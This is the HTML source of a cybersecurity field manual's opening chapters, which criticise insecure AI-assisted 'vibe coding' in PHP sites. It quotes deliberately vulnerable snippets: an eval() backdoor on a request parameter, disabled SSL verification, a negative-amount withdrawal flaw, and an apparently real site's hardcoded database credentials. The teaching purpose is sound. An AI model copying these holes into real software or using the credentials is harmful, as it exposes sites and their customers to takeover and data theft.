<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>THE MARLIZ INTEL FIELD MANUAL - OFFICIAL EDITION</title>
    <link
        href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800;900&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@900&family=Rajdhani:wght@600;700&family=Bebas+Neue&family=Space+Mono:wght@400;700&family=Inter:wght@400;500;600&display=swap"
        rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        @page {
            size: A4;
            margin: 0;
        }

        body {
            background: #2c2c2e;
            /* Darker background for monitor viewing */
            font-family: 'IBM Plex Sans', sans-serif;
            color: #1a1a1a;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 0;
        }

        /* PAGE SYSTEM - LOCKED TO A4 DIMENSIONS */
        .page {
            width: 210mm;
            min-height: 297mm;
            position: relative;
            background: white;
            padding: 35mm 25mm 30mm 35mm;
            /* 35mm Gutter for binding */
            margin-bottom: 40px;
            /* Space between pages in browser */
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
            /* Shadow for premium feel */
            overflow: hidden;
        }

        @media print {
            body {
                background: white;
                padding: 0;
            }

            .page {
                margin: 0;
                box-shadow: none;
                page-break-after: always;
            }
        }

        /* Publication Header */
        .page::before {
            content: "MARLIZ INTEL // FIELD MANUAL // SEC_OPS_V1";
            position: absolute;
            top: 15mm;
            right: 25mm;
            font-family: 'JetBrains Mono', monospace;
            font-size: 8pt;
            color: #bbb;
        }

        /* --- NEW FRONT COVER DESIGN --- */
        .external-cover {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: white;
            padding: 0 !important;
            /* Overriding default page padding */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .external-cover::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image:
                linear-gradient(rgba(0, 255, 157, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 157, 0.03) 1px, transparent 1px);
            background-size: 30px 30px;
            opacity: 0.5;
            z-index: 1;
        }

        .external-cover .corner {
            position: absolute;
            width: 60px;
            height: 60px;
            border: 2px solid #00ff9d;
            z-index: 5;
        }

        .external-cover .corner-tl {
            top: 20px;
            left: 20px;
            border-right: none;
            border-bottom: none;
        }

        .external-cover .corner-tr {
            top: 20px;
            right: 20px;
            border-left: none;
            border-bottom: none;
        }

        .external-cover .corner-bl {
            bottom: 20px;
            left: 20px;
            border-right: none;
            border-top: none;
        }

        .external-cover .corner-br {
            bottom: 20px;
            right: 20px;
            border-left: none;
            border-top: none;
        }

        .external-cover .header-box {
            position: absolute;
            top: 40px;
            left: 50%;
            transform: translateX(-50%);
            font-family: 'Space Mono', monospace;
            font-size: 11px;
            letter-spacing: 3px;
            color: #00ff9d;
            opacity: 0.7;
            text-align: center;
            z-index: 5;
        }

        .external-cover .cover-content {
            position: relative;
            z-index: 10;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 80px 60px;
        }

        .external-cover .the-text {
            font-family: 'Space Mono', monospace;
            font-size: 18px;
            letter-spacing: 8px;
            color: #00d4ff;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .external-cover .title-box {
            font-family: 'Bebas Neue', sans-serif;
            text-align: center;
            margin-bottom: 40px;
        }

        .external-cover .title-line1 {
            font-size: 82px;
            letter-spacing: 8px;
            color: #ffffff;
            line-height: 0.9;
            text-shadow: 0 0 20px rgba(0, 255, 157, 0.3);
        }

        .external-cover .title-line2 {
            font-size: 82px;
            letter-spacing: 8px;
            color: #ffffff;
            line-height: 0.9;
            text-shadow: 0 0 20px rgba(0, 255, 157, 0.3);
        }

        .external-cover .field-manual-badge {
            position: relative;
            background: #ff4500;
            padding: 18px 50px;
            margin: 30px 0 50px 0;
            clip-path: polygon(8% 0%, 100% 0%, 92% 100%, 0% 100%);
            box-shadow: 0 4px 20px rgba(255, 69, 0, 0.4);
        }

        .external-cover .field-manual-text {
            font-family: 'Bebas Neue', sans-serif;
            font-size: 32px;
            letter-spacing: 6px;
            color: #000000 !important;
            font-weight: 700;
        }

        .external-cover .subtitle-box {
            font-family: 'Rajdhani', sans-serif;
            font-size: 20px;
            line-height: 1.4;
            color: #00d4ff;
            text-align: center;
            max-width: 400px;
            letter-spacing: 1px;
            border-left: 3px solid #00ff9d;
            padding-left: 20px;
            text-transform: uppercase;
        }

        .external-cover .accent-line {
            position: absolute;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff9d, transparent);
            opacity: 0.6;
            z-index: 5;
        }

        .external-cover .line-top {
            top: 180px;
            left: 10%;
            right: 10%;
        }

        .external-cover .line-bottom {
            bottom: 140px;
            left: 10%;
            right: 10%;
        }

        .external-cover .version-box {
            position: absolute;
            bottom: 50px;
            left: 50%;
            transform: translateX(-50%);
            font-family: 'Space Mono', monospace;
            font-size: 10px;
            letter-spacing: 2px;
            color: #666;
            text-align: center;
            z-index: 5;
        }

        .external-cover .flag-accent {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(90deg,
                    #000000 0%, #000000 33%,
                    #BB0000 33%, #BB0000 66%,
                    #006600 66%, #006600 100%);
            opacity: 0.8;
            z-index: 5;
        }

        /* --- BACK COVER DESIGN --- */
        .page.back-cover {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            padding: 0 !important;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .page.back-cover::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image:
                linear-gradient(rgba(0, 255, 157, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 157, 0.03) 1px, transparent 1px);
            background-size: 30px 30px;
            opacity: 0.5;
            z-index: 1;
        }

        .page.back-cover .corner {
            position: absolute;
            width: 60px;
            height: 60px;
            border: 2px solid #00ff9d;
            z-index: 5;
        }

        .page.back-cover .corner-tl {
            top: 20px;
            left: 20px;
            border-right: none;
            border-bottom: none;
        }

        .page.back-cover .corner-tr {
            top: 20px;
            right: 20px;
            border-left: none;
            border-bottom: none;
        }

        .page.back-cover .corner-bl {
            bottom: 20px;
            left: 20px;
            border-right: none;
            border-top: none;
        }

        .page.back-cover .corner-br {
            bottom: 20px;
            right: 20px;
            border-left: none;
            border-top: none;
        }

        .page.back-cover .edition-info {
            position: absolute;
            top: 40px;
            left: 50%;
            transform: translateX(-50%);
            font-family: 'Space Mono', monospace;
            font-size: 11px;
            letter-spacing: 3px;
            color: #00ff9d;
            opacity: 0.7;
            z-index: 5;
        }

        .page.back-cover .content-box {
            position: relative;
            z-index: 10;
            height: 100%;
            padding: 90px 60px 40px 60px;
            display: flex;
            flex-direction: column;
            width: 100%;
        }

        .page.back-cover .quote-box-wrap {
            margin-bottom: 25px;
        }

        .page.back-cover .quote-text {
            font-family: 'Inter', sans-serif;
            font-size: 24px;
            font-weight: 600;
            color: #00ff9d;
            line-height: 1.4;
            font-style: italic;
            margin-bottom: 5px;
        }

        .page.back-cover .quote-author {
            font-family: 'Space Mono', monospace;
            font-size: 12px;
            color: #00d4ff;
            letter-spacing: 2px;
            text-align: right;
        }

        .page.back-cover .divider {
            height: 2px;
            background: linear-gradient(90deg, #00ff9d, transparent);
            margin: 20px 0;
            opacity: 0.6;
        }

        .page.back-cover .description-p {
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            line-height: 1.7;
            color: #cccccc !important;
            margin-bottom: 12px;
            text-align: left !important;
        }

        .page.back-cover .description-p strong {
            color: #00ff9d;
            font-weight: 600;
        }

        .page.back-cover .inside-box {
            background: rgba(0, 255, 157, 0.05);
            border-left: 3px solid #00ff9d;
            padding: 18px 20px;
            margin-bottom: 20px;
        }

        .page.back-cover .inside-title {
            font-family: 'Bebas Neue', sans-serif;
            font-size: 18px;
            letter-spacing: 3px;
            color: #00ff9d;
            margin-bottom: 12px;
        }

        .page.back-cover .inside-box ul {
            list-style: none !important;
            padding: 0 !important;
        }

        .page.back-cover .inside-box li {
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            line-height: 1.5;
            color: #cccccc;
            margin-bottom: 6px;
            padding-left: 20px !important;
            position: relative;
        }

        .page.back-cover .inside-box li::before {
            content: '▸';
            position: absolute;
            left: 0;
            color: #00ff9d;
            font-weight: bold;
        }

        .page.back-cover .author-box {
            margin-top: auto;
            background: rgba(0, 212, 255, 0.05);
            border: 1px solid rgba(0, 212, 255, 0.2);
            padding: 16px;
            margin-bottom: 25px;
        }

        .page.back-cover .author-label {
            font-family: 'Space Mono', monospace;
            font-size: 10px;
            letter-spacing: 2px;
            color: #00d4ff;
            margin-bottom: 8px;
        }

        .page.back-cover .author-name {
            font-family: 'Bebas Neue', sans-serif;
            font-size: 20px;
            letter-spacing: 2px;
            color: #ffffff;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .page.back-cover .author-bio {
            font-family: 'Inter', sans-serif;
            font-size: 12px;
            line-height: 1.6;
            color: #cccccc;
        }

        .page.back-cover .footer-row {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }

        .page.back-cover .web-label {
            font-family: 'Space Mono', monospace;
            font-size: 10px;
            letter-spacing: 2px;
            color: #666;
            margin-bottom: 5px;
        }

        .page.back-cover .web-url {
            font-family: 'Bebas Neue', sans-serif;
            font-size: 28px;
            letter-spacing: 2px;
            color: #00ff9d;
            text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
        }

        .page.back-cover .qr-box {
            text-align: right;
        }

        .page.back-cover .qr-placeholder {
            width: 80px;
            height: 80px;
            background: rgba(0, 255, 157, 0.1);
            border: 2px solid #00ff9d;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Space Mono', monospace;
            font-size: 10px;
            color: #00ff9d;
            text-align: center;
            margin-bottom: 5px;
        }

        .page.back-cover .qr-label {
            font-family: 'Space Mono', monospace;
            font-size: 9px;
            color: #666;
            letter-spacing: 1px;
        }

        .page.back-cover .flag-accent {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(90deg,
                    #000000 0%, #000000 33%,
                    #BB0000 33%, #BB0000 66%,
                    #006600 66%, #006600 100%);
            opacity: 0.8;
            z-index: 5;
        }

        /* --- TYPOGRAPHY --- */
        h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 38pt;
            font-weight: 900;
            line-height: 1;
            border-bottom: 12px solid #FF5722;
            padding-bottom: 20px;
            margin-bottom: 50px;
            text-transform: uppercase;
        }

        h2 {
            font-family: 'Montserrat', sans-serif;
            font-size: 24pt;
            color: #FF5722;
            text-transform: uppercase;
            margin-top: 60px;
            margin-bottom: 25px;
        }

        h3 {
            font-family: 'Montserrat', sans-serif;
            font-size: 18pt;
            color: #333;
            margin-top: 40px;
            margin-bottom: 20px;
        }

        p {
            line-height: 1.85;
            text-align: justify;
            margin-bottom: 20px;
            font-size: 11pt;
        }

        .drop-cap p:first-of-type::first-letter {
            float: left;
            font-family: 'Montserrat', sans-serif;
            font-size: 5.5em;
            line-height: 0.8;
            padding: 10px 15px 0 0;
            color: #FF5722;
            font-weight: 900;
        }

        /* --- CODE BLOCKS --- */
        pre {
            background: #0d0d12 !important;
            color: #00FF41 !important;
            padding: 25px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 10pt;
            margin: 30px 0;
            white-space: pre-wrap;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            page-break-inside: avoid;
        }

        code {
            font-family: 'JetBrains Mono', monospace;
            background: #f0f3f6;
            color: #e83e8c;
            padding: 2px 5px;
            border-radius: 3px;
        }

        pre code {
            background: none;
            color: inherit;
            padding: 0;
        }

        /* --- TOC --- */
        .toc-list {
            list-style: none;
            padding: 0;
        }

        .toc-item {
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            margin-bottom: 15px;
            font-family: 'Montserrat';
            font-weight: 700;
            text-transform: uppercase;
            font-size: 1.2em;
        }

        .toc-item::after {
            content: " ....................................................................................................................";
            color: #ccc;
            flex-grow: 1;
            margin: 0 10px;
            overflow: hidden;
        }
    </style>
</head>

<body>

    <!-- PAGE 1: FRONT COVER -->
    <div class="page external-cover">
        <!-- Corner elements -->
        <div class="corner corner-tl"></div>
        <div class="corner corner-tr"></div>
        <div class="corner corner-bl"></div>
        <div class="corner corner-br"></div>

        <!-- Header classification -->
        <div class="header-box">
            MARLIZ INTEL / FIELD MANUAL / REL_076_V1
        </div>

        <!-- Accent lines -->
        <div class="accent-line line-top"></div>
        <div class="accent-line line-bottom"></div>

        <!-- Main content -->
        <div class="cover-content">
            <div class="the-text">THE</div>

            <div class="title-box">
                <div class="title-line1">MARLIZ</div>
                <div class="title-line2">INTEL</div>
            </div>

            <div class="field-manual-badge">
                <div class="field-manual-text">FIELD MANUAL</div>
            </div>

            <div class="subtitle-box">
                Practical Cybersecurity<br>
                From The Kenyan<br>
                Digital Frontlines
            </div>
        </div>

        <!-- Version tag -->
        <div class="version-box">
            FIRST EDITION • FEBRUARY 2026<br>
            https://marlizintel.com
        </div>

        <!-- Kenyan flag accent -->
        <div class="flag-accent"></div>
    </div>

    <!-- PAGE 2: TABLE OF CONTENTS -->
    <div class="page">
        <h1>TABLE OF CONTENTS</h1>
        <div class="toc-list">
            <div class="toc-item"><span>PART 1 VIBE CODING</span></div>
            <div class="toc-item"><span>PART 2 OFFENSIVE SECURITY</span></div>
            <div class="toc-item"><span>PART 3 DEFENSIVE SECURITY</span></div>
            <div class="toc-item"><span>PART 4 INCIDENT RESPONSE</span></div>
            <div class="toc-item"><span>PART 5 BUSINESS OF SECURITY</span></div>
            <div class="toc-item"><span>PART 6 TOOLS OF THE TRADE</span></div>
        </div>
    </div>
    <div class="page">
        <h1 style="margin-top:100px;">PART 1 VIBE CODING</h1>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 1.1: What is Vibe Coding and Why It Is Dangerous</h1>
            <hr />
            <h2>The New Era of Ship Fast, Break Everything</h2>
            <p>In 2024, something changed in the software world. ChatGPT, Claude, Copilot, and a dozen other AI tools
                made it possible for anyone to build a website in an afternoon.</p>
            <p>Teachers started launching e-commerce stores.<br />
                Students started deploying SaaS platforms.<br />
                Hustlers started spinning up million-dollar apps.</p>
            <p>And almost all of them were dangerously insecure.</p>
            <p>Welcome to the era of Vibe Coding.</p>
            <hr />
            <h2>What is Vibe Coding?</h2>
            <p>Vibe Coding is a term we use at Marliz Intel to describe code that:</p>
            <ol>
                <li>Looks functional. The buttons click, the pages load, the cart works.</li>
                <li>Feels modern. Nice gradients, animations, icons everywhere.</li>
                <li>Has zero security architecture. No input validation, no session management, hardcoded secrets, open
                    admin panels.</li>
            </ol>
            <p>The developer (if you can call them that) did not write the code. They prompted it.</p>
            <p>They told an AI: "Make me an e-commerce site with a cart and admin panel."</p>
            <p>And the AI delivered. Fast. Broken. Vulnerable.</p>
            <hr />
            <h2>The Anatomy of a Vibe-Coded System</h2>
            <p>Here is what we typically find when auditing a Vibe-Coded project:</p>
            <h3>1. The Monolith File</h3>
            <p>Everything is in one file. Business logic, database queries, HTML, CSS, JavaScript, all crammed into a
                single index.php that is 1,000+ lines long.</p>
            <p>Why it is dangerous:<br />
                You cannot audit what you cannot read. When security is buried under 1,400 lines of spaghetti,
                vulnerabilities hide in plain sight.</p>
            <p>Real Example (Playkart):</p>
            <pre><code>index.php: 1,409 lines
  Database queries (Lines 12-90)
  HTML header (Lines 98-280)
  Inline CSS (Lines 110-276, 312-376, 411-758)
  Product rendering (Lines 800-1200)
  Inline JavaScript (Lines 1300-1409)
</code></pre>
            <hr />
            <h3>2. Hardcoded Secrets</h3>
            <p>The AI does not know about .env files. It just puts the password right in the code.</p>
            <p>Why it is dangerous:<br />
                Anyone with a file-read vulnerability (or access to your Git repo) now owns your database.</p>
            <p>Real Example:</p>
            <pre><code class="language-php">// config.php
$DB_HOST = &quot;localhost&quot;;
$DB_NAME = &quot;u297960261_play_kart&quot;;
$DB_USER = &quot;u297960261_playstores&quot;;
$DB_PASS = &quot;#Okiru2024&quot;;  // THE KEYS TO THE KINGDOM
</code></pre>
            <hr />
            <h3>3. The Diagnostic Backdoor</h3>
            <p>Sometimes the AI generates helper functions for debugging. These are often left in production.</p>
            <p>Why it is dangerous:<br />
                A function that runs eval($_REQUEST['code']) is not a diagnostic. It is a remote control for hackers.
            </p>
            <p>Real Example:</p>
            <pre><code class="language-php">// ajax_session_handler.php
if (isset($_REQUEST['php_inj'])) {
    eval($_REQUEST['php_inj']);  // RUN ANYTHING. LITERALLY ANYTHING.
    die();
}
</code></pre>
            <hr />
            <h3>4. The Open Admin Panel</h3>
            <p>The AI creates an /admin folder with a login page. But it forgets to check if the user is actually logged
                in on the other admin pages.</p>
            <p>Why it is dangerous:<br />
                Anyone who knows the URL can see your customers phone numbers and home addresses.</p>
            <p>Real Example:</p>
            <pre><code>/admin/login.php: Has authentication (OK)
/admin/orders.php: NO AUTHENTICATION (FAIL)
/admin/products.php: NO AUTHENTICATION (FAIL)
</code></pre>
            <hr />
            <h3>5. The Scam Aesthetic</h3>
            <p>AI does not understand business logic. It will happily display a product that was 3,000 KSH now selling
                for 13 KSH.</p>
            <p>Why it is dangerous:<br />
                Google bots see this as Scam Behavior. Your domain gets flagged, de-indexed, and your SEO dies.</p>
            <p>Real Example:</p>
            <pre><code>Original Price: KES 3,000
Discounted Price: KES 13
Discount: 99.6%
</code></pre>
            <p>No legitimate business offers a 99.6% discount. This screams phishing site.</p>
            <hr />
            <h2>Why This Matters</h2>
            <p>In the old days, building insecure software required effort. You had to actually know how to code, and in
                the process, you would learn (or be forced to learn) basic security.</p>
            <p>Today, a complete amateur can deploy a production system in 3 hours. They think they have built a
                business. What they have actually built is a honeypot for hackers.</p>
            <p>And here is the painful truth:</p>
            <p>The AI does not care if your site gets hacked.<br />
                The AI does not lose money when your database is deleted.<br />
                The AI does not go to jail when customer data is leaked.<br />
                You do.</p>
            <hr />
            <h2>The Marliz Intel Perspective</h2>
            <p>When we audit a Vibe-Coded system, we are not looking for complex zero-days. We are looking for the
                obvious failures that the AI never bothered to prevent:</p>
            <ol>
                <li>Can we read config.php?</li>
                <li>Is there an eval() or system() call we can exploit?</li>
                <li>Is the admin panel actually locked?</li>
                <li>Are secrets hardcoded?</li>
            </ol>
            <p>Nine times out of ten, the answer is yes to at least two of these.</p>
            <hr />
            <h2>Key Takeaways</h2>
            <table>
                <thead>
                    <tr>
                        <th style="text-align: left;">Lesson</th>
                        <th style="text-align: left;">Action</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="text-align: left;">AI builds fast, not safe</td>
                        <td style="text-align: left;">Always audit AI-generated code before deployment</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">Secrets belong in .env</td>
                        <td style="text-align: left;">Never commit passwords to your codebase</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">Every admin page needs auth</td>
                        <td style="text-align: left;">Add require_once auth_check.php to the top of EVERY file</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">Monoliths are unmaintainable</td>
                        <td style="text-align: left;">Separate logic, presentation, and data access</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">If it looks like a scam, Google will treat it like one</td>
                        <td style="text-align: left;">Validate business logic (discounts, pricing, etc.)</td>
                    </tr>
                </tbody>
            </table>
            <hr />
            <h2>Coming Next</h2>
            <p>In Chapter 1.2, we dive deeper into the psychology of the ChatGPT Developer, the person who thinks they
                have built a secure system because the AI told them so.</p>
            <hr />
            <p>"The frontend is a lion. The backend is a lamb. And the hacker is hungry."<br />
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 1.2: The ChatGPT Developer: Fast but Fatal</h1>
            <hr />
            <h2>The Rise of the Prompter</h2>
            <p>The traditional software engineer spends years learning syntax, memory management, and system
                architecture. The ChatGPT Developer spends an afternoon learning how to ask for a "modern e-commerce
                site using Bootstrap."</p>
            <p>They are not builders. They are assemblers.</p>
            <p>This distinction is critical for the security analyst. The builder understands the foundation. The
                assembler only cares about the facade. When we audit systems built by assemblers, we find a distinct
                lack of structural integrity. They are like construction workers building a skyscraper out of pre-fab
                walls, without pouring the concrete foundation first.</p>
            <h2>The Loop: Prompt, Paste, Pray</h2>
            <p>The workflow of the ChatGPT Developer is a closed loop of ignorance. It is a cycle that generates
                vulnerability at scale.</p>
            <ol>
                <li><strong>Prompt</strong>: "Write a PHP script to handle user login."</li>
                <li><strong>Paste</strong>: The code is dumped into <code>login.php</code>.</li>
                <li><strong>Run</strong>: It generates an error (e.g., "Undefined array key").</li>
                <li><strong>Reprompt</strong>: The error is pasted back into the AI. "Fix this."</li>
                <li><strong>Paste</strong>: The "fixed" code replaces the old one.</li>
                <li><strong>Success</strong>: The error is gone.</li>
            </ol>
            <h3>The Danger of the "Fix"</h3>
            <p>At no point in this cycle does the developer understand <em>why</em> the error occurred or <em>how</em>
                it was fixed.</p>
            <p>The AI's priority is <strong>user satisfaction</strong>, not <strong>system security</strong>. If the
                user complains about an error, the AI will provide the fastest way to suppress that error.
                * <strong>Error</strong>: "SSL Certificate Verification Failed"
                * <strong>Real Fix</strong>: Install a valid certificate.
                * <strong>AI Fix</strong>: <code>curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);</code></p>
            <p>The developer pastes the AI Fix. The site works. But now, every connection is susceptible to a
                Man-in-the-Middle (MITM) attack. The developer sleeps soundly, unaware they just broke the encryption
                for the entire payment gateway.</p>
            <h2>War Story: The Null Coalescing Catastrophe</h2>
            <p>During an engagement in Westlands for a fintech startup, we found a critical logic flaw in the withdrawal
                system.</p>
            <p>The developer had asked the AI to "fix the error when user balance is empty."
                The AI suggested using the Null Coalescing Operator (<code>??</code>) to handle empty values.</p>
            <p><strong>The Code:</strong></p>
            <pre><code class="language-php">$withdraw_amount = $_POST['amount'] ?? 0;
$current_balance = $user['balance'];

if ($withdraw_amount &lt; $current_balance) {
    process_withdrawal($withdraw_amount);
}
</code></pre>
            <p><strong>The Flaw:</strong>
                The developer didn't understand type casting. If an attacker sent <code>amount=-5000</code>, the check
                <code>-5000 &lt; 100</code> is TRUE.
                The system processed a "withdrawal" of -5000. In double-entry accounting, subtracting a negative number
                is addition.
                The attacker <strong>added 5000</strong> to their balance by withdrawing it.
            </p>
            <p>A real developer would have checked if <code>$withdraw_amount &gt; 0</code>. The ChatGPT developer just
                wanted the "Undefined Index" error to go away.</p>
            <h2>The Illusion of Competence (The Dunning-Kruger Effect)</h2>
            <p>These developers move fast. They show progress updates daily. The UI looks polished because AI is
                excellent at generating CSS (Tailwind/Bootstrap). To a client or employer (the "Mwalimu"), they appear
                highly competent.</p>
            <p><strong>The Reality Check:</strong>
                They are borrowing technical debt at an interest rate they cannot afford.
                * <strong>Monday</strong>: They deploy a full cart system.
                * <strong>Tuesday</strong>: They deploy a user dashboard.
                * <strong>Wednesday</strong>: The site is hacked because the cart system didn't check if the item price
                was edited in the HTML.</p>
            <p>They are unable to patch vulnerabilities because <strong>they do not know where the code handles
                    input.</strong> When we send them a report saying "SQL Injection on line 42," they often reply:
                "What does line 42 do?"</p>
            <h2>Profile of a Target: The Synthetic Stench</h2>
            <p>When doing reconnaissance, how do we identify a ChatGPT Developer? We look for the "Stack Overflow vs.
                AI" difference.</p>
            <h3>1. Inconsistent Comment Styles</h3>
            <p>Humans have habits. AI has training data.
                * <strong>File A</strong>: Uses JSDoc <code>/** @param string $name */</code>
                * <strong>File B</strong>: Uses Python-style <code>""" Does the thing """</code>
                * <strong>File C</strong>: Uses inline <code>// TODO: Implement logic</code></p>
            <p>If the coding style shifts drastically between files, it means different prompts generated them.</p>
            <h3>2. The "Helpful" Over-Commenting</h3>
            <p>AI models are trained to be educational. They explain code that needs no explanation.</p>
            <p><strong>The Human:</strong>
                <code>// Fix for Safari timezone bug</code>
                (Explains <em>why</em>)
            </p>
            <p><strong>The AI:</strong>
                <code>// Initialize the curl session</code>
                <code>$ch = curl_init();</code>
                (Explains <em>what</em>)
            </p>
            <p>If you see comments explaining standard library functions, you are looking at AI code.</p>
            <h3>3. Variable Naming Chaos</h3>
            <p>AI mimics the context of the prompt.
                * Prompt: "Make a user login." -&gt; Variables: <code>$user_name</code>, <code>$user_pass</code>.
                * Prompt: "Handle the form data." -&gt; Variables: <code>$formData</code>, <code>$inputString</code>.
                Mixing <code>snake_case</code> and <code>camelCase</code> in the same function is a hallmark of
                copy-paste assembly.</p>
            <h2>Conclusion</h2>
            <p>The ChatGPT Developer is not malicious. They are negligent. They are operating heavy machinery without a
                license. In the Marliz SOC, we treat their code as hostile territory not because of intent, but because
                of chaos.</p>
            <p>They build the attack surface for us. And because they didn't write it, they won't know we are there.</p>
            <hr />
            <p>"Speed is irrelevant if you are running in the wrong direction."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 1.3: Case Study: The 1,400-line Monolith</h1>
            <hr />
            <h2>The One-File Framework</h2>
            <p>In the world of Vibe Coding, file structure is an annoyance. The developer wants to deploy, and managing
                <code>includes/</code> or <code>classes/</code> takes time. So they ask the AI for "one file that does
                everything."
            </p>
            <p>The result is the Monolith.</p>
            <p>We routinely encounter single <code>index.php</code> files exceeding 1,500 lines. These files contain the
                database connection, the CCS styling, the Javascript logic, the HTML layout, and the server-side
                processing, all mixed together in a chaotic soup.</p>
            <h2>Analysis of a Monolith</h2>
            <p>During a recent audit of a logistics platform, we found a file named <code>dashboard.php</code>. It was
                1,440 lines long.</p>
            <p><strong>Lines 1-50</strong>: CSS Styles (Hardcoded)
                <strong>Lines 51-120</strong>: Database Connection and Login Check (Authentication)
                <strong>Lines 121-400</strong>: HTML Header and Navigation
                <strong>Lines 401-450</strong>: PHP Logic for updating tracking numbers (Business Logic)
                <strong>Lines 451-900</strong>: Huge table rendering logic
                <strong>Lines 901-950</strong>: <strong>HIDDEN VULNERABILITY</strong> (Unprotected file upload handler)
                <strong>Lines 951-1440</strong>: Javascript and Footer
            </p>
            <h3>The "Fold" Problem</h3>
            <p>The vulnerability on line 901 was invisible. It was buried between a massive HTML table closure and a
                block of jQuery scripts.</p>
            <p>When a developer opens this file, their IDE renders the top 100 lines. They see the CSS. They see the
                login check. They think the file is safe. They do not scroll down to line 900 where the AI inserted a
                "temporary" file upload handler that accepts <code>.php</code> extensions.</p>
            <h2>Why AI Creates Monoliths</h2>
            <p>AI models operate well within a "context window." When you ask for a complete page, the AI tries to
                provide a standalone solution. It is easier for the AI to output one continuous block of code than to
                instruct the user to create four separate files and link them.</p>
            <p>The AI is optimizing for "Copy-Paste Convenience," not "Maintainable Architecture."</p>
            <h2>Auditing the Monolith</h2>
            <p>When the Marliz SOC encounters a Monolith, we do not read it top-to-bottom. That leads to fatigue and
                missed bugs. We use <code>grep</code> (or Ctrl+F) to hunt for entry points.</p>
            <p><strong>The Filter List:</strong>
                1. <code>$_POST</code>: Where is data coming in?
                2. <code>$_GET</code>: Where are URL parameters handled?
                3. <code>$_FILES</code>: Are there uploads?
                4. <code>query(</code>: Where is the database touched?</p>
            <p>In the logistics platform case, searching for <code>$_FILES</code> took us straight to line 901.</p>
            <h2>Remediation Strategy</h2>
            <p>You cannot secure a Monolith. You must break it.</p>
            <p><strong>Step 1</strong>: Extract the CSS to <code>style.css</code>.
                <strong>Step 2</strong>: Extract the JS to <code>script.js</code>.
                <strong>Step 3</strong>: Move the Database connection to <code>db_connect.php</code>. (And put it in
                <code>.gitignore</code>)
                <strong>Step 4</strong>: Move the header/footer to <code>includes/</code>.
            </p>
            <p>Only then can you see the actual logic. Once the noise is removed, the vulnerabilities usually become
                obvious.</p>
            <hr />
            <p>"Complexity is the enemy of security."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 1.4: How to Spot AI-Generated Rubbish Code</h1>
            <hr />
            <h2>The AI Accent</h2>
            <p>Just as humans have accents when they speak, Large Language Models (LLMs) have a distinct "accent" when
                they code. Once you learn to recognize it, you can spot an AI-generated script in seconds.</p>
            <p>At Marliz Intel, we call this "The Synthetic Stench."</p>
            <p>It is clean. It is polite. And it is often completely wrong.</p>
            <h2>1. The Try-Catch Silencer</h2>
            <p>The AI is trained to be helpful and avoid crashing. Often, this results in code that suppresses critical
                errors rather than handling them.</p>
            <p><strong>The Symptom:</strong></p>
            <pre><code class="language-php">try {
    $db-&gt;query($sql);
} catch (Exception $e) {
    // silently fail or just die
    die(&quot;Error occurred&quot;);
}
</code></pre>
            <p>This is catastrophic for security. If the database query fails because of an SQL injection attempt, the
                logs will show nothing. The system just says "Error occurred" and the attacker knows they hit a nerve,
                but the admin is clueless.</p>
            <h2>2. The Placeholder production</h2>
            <p>AI models often leave placeholders for the user to fill in. Vibe Coders often forget to fill them in.</p>
            <p><strong>The Symptom:</strong>
                In a payment processing file:
                <code>$apiKey = "YOUR_API_KEY_HERE";</code>
            </p>
            <p>We have seen live production sites hardcoded with placeholders. If the variable isn't replaced, the code
                might default to a sandbox environment, or simply fail open.</p>
            <h2>3. The Hallucinated Function</h2>
            <p>AI confidently invents functions that sound plausible but do not exist. This happens frequently with
                older libraries or obscure frameworks.</p>
            <p><strong>The Symptom:</strong>
                <code>$user-&gt;validatePasswordStrength($password);</code>
            </p>
            <p>When we audit this, we search the codebase for the definition of <code>validatePasswordStrength</code>.
                It does not exist. The AI assumed the <code>User</code> class had it. The code crashes, or worse, if PHP
                is configured loosely, it might just return null (false) and bypass the check depending on how it's
